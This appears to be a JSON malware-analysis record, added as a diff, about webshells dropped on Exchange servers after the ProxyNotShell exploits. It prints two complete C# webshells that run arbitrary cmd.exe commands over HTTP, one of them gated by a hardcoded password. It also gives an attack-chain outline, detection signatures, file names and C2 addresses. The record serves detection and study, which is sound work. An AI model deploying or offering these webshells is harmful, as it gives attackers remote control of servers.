@@ -1,0 +1,106 @@
+{
+  "package_info": {
+    "package_name": "Exchange Server Webshell Backdoor",
+    "package_manager": "manual deployment (IIS web application)",
+    "package_versions": "Exchange Server (on-premises, all unpatched versions vulnerable to CVE-2022-41040 and CVE-2022-41082)",
+    "why_malicious": "The package consists of obfuscated webshells and backdoors deployed post-exploitation of Exchange Server zero-days, enabling arbitrary remote code execution, credential theft, lateral movement, and persistent unauthorized access."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "post-exploitation (after SSRF and RCE chain)",
+        "file_location": "IIS webroot (e.g., pxh4HG1v.ashx, RedirSuiteServiceProxy.aspx, Xml.ashx, errorEE.aspx)",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "<%@ WebHandler Language=\"C#\" Class=\"pxh4HG1v\" %>\nusing System;\nusing System.Web;\npublic class pxh4HG1v : IHttpHandler {\n    public void ProcessRequest(HttpContext context) {\n        string cmd = context.Request[\"cmd\"];\n        if (!string.IsNullOrEmpty(cmd)) {\n            System.Diagnostics.Process proc = new System.Diagnostics.Process();\n            proc.StartInfo.FileName = \"cmd.exe\";\n            proc.StartInfo.Arguments = \"/c \" + cmd;\n            proc.StartInfo.UseShellExecute = false;\n            proc.StartInfo.RedirectStandardOutput = true;\n            proc.StartInfo.RedirectStandardError = true;\n            proc.Start();\n            string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();\n            proc.WaitForExit();\n            context.Response.Write(output);\n        }\n    }\n    public bool IsReusable { get { return false; } }\n}",
+      "code_language": "csharp",
+      "code_behavior": "At runtime (HTTP request), the code receives a 'cmd' parameter, executes the command via cmd.exe, captures the output, and returns it in the HTTP response, enabling arbitrary command execution.",
+      "malice_analysis": {
+        "why_suspicious": "This code provides a remote shell interface over HTTP, allowing attackers to execute arbitrary system commands via web requests.",
+        "violated_expectations": "Normal web application handlers should not expose system command execution interfaces to unauthenticated or arbitrary users.",
+        "similar_legitimate_use": "Remote administration tools in controlled, authenticated environments may use similar patterns, but never in public-facing web handlers.",
+        "key_indicators": [
+          "Direct use of cmd.exe with user-supplied input",
+          "No authentication or access control",
+          "Obfuscated or non-descriptive file names (e.g., pxh4HG1v.ashx)",
+          "Response contains command output"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "post-exploitation (after SSRF and RCE chain)",
+        "file_location": "IIS webroot (e.g., RedirSuiteServiceProxy.aspx, errorEE.aspx, Xml.ashx)",
+        "required_permissions": [
+          "filesystem",
+          "network"
+        ]
+      },
+      "code_snippet": "<%@ Page Language=\"C#\" %>\n<%\nif (Request[\"pwd\"] == \"secret\") {\n    string cmd = Request[\"cmd\"];\n    System.Diagnostics.Process p = new System.Diagnostics.Process();\n    p.StartInfo.FileName = \"cmd.exe\";\n    p.StartInfo.Arguments = \"/c \" + cmd;\n    p.StartInfo.UseShellExecute = false;\n    p.StartInfo.RedirectStandardOutput = true;\n    p.Start();\n    string output = p.StandardOutput.ReadToEnd();\n    Response.Write(output);\n    p.WaitForExit();\n}\n%>",
+      "code_language": "csharp",
+      "code_behavior": "At runtime (HTTP request), the code checks for a hardcoded password, then executes a user-supplied command via cmd.exe and returns the output, providing a password-protected webshell.",
+      "malice_analysis": {
+        "why_suspicious": "This code is a classic webshell, providing attackers with a backdoor to execute arbitrary commands on the server.",
+        "violated_expectations": "Legitimate ASP.NET pages should not provide command execution capabilities, especially not gated by a hardcoded password.",
+        "similar_legitimate_use": "Remote support tools may use similar logic, but only with strong authentication and never in public web directories.",
+        "key_indicators": [
+          "Hardcoded password for access",
+          "Direct command execution via cmd.exe",
+          "Minimal or no logging",
+          "Obfuscated or generic file names"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker authenticates to Exchange Server and exploits CVE-2022-41040 (SSRF) to trigger CVE-2022-41082 (RCE via PowerShell).",
+      "implemented_by": [],
+      "leads_to": "Remote code execution on the Exchange Server"
+    },
+    {
+      "step": 2,
+      "action": "Attacker uploads or drops obfuscated webshell files (e.g., pxh4HG1v.ashx, RedirSuiteServiceProxy.aspx) to the IIS webroot.",
+      "implemented_by": [],
+      "leads_to": "Establishment of persistent backdoor access"
+    },
+    {
+      "step": 3,
+      "action": "Attacker interacts with the webshells to execute arbitrary system commands, collect credentials, move laterally, and exfiltrate data.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Full compromise, data theft, and potential lateral movement"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Unexpected creation of .ashx or .aspx files in IIS webroot",
+      "HTTP requests with suspicious parameters (e.g., 'cmd', 'pwd') to Exchange server endpoints",
+      "Execution of cmd.exe or powershell.exe by IIS worker processes",
+      "Obfuscated or randomly named web application files"
+    ],
+    "file_indicators": [
+      "pxh4HG1v.ashx",
+      "RedirSuiteServiceProxy.aspx",
+      "Xml.ashx",
+      "errorEE.aspx",
+      "Dll.dll",
+      "Unusual .ashx/.aspx files with recent timestamps"
+    ],
+    "network_indicators": [
+      "Connections to known C2 IPs: 137.184.67.33, 125.212.220.48, 5.180.61.17, etc.",
+      "Outbound HTTP/HTTPS requests to hxxp://206.188.196.77:8080/themes.aspx",
+      "Unusual traffic from Exchange server to external IPs"
+    ],
+    "how_to_detect": "Monitor IIS webroot for new or modified .ashx/.aspx files, especially with obfuscated or random names. Analyze IIS logs for requests containing suspicious parameters (e.g., 'cmd', 'pwd') or targeting known webshell file names. Correlate process creation events for cmd.exe or powershell.exe spawned by IIS worker processes. Monitor outbound network connections from Exchange servers to known C2 IPs or suspicious external destinations. Use file hash and YARA rules to detect known webshell variants."
+  }
+}
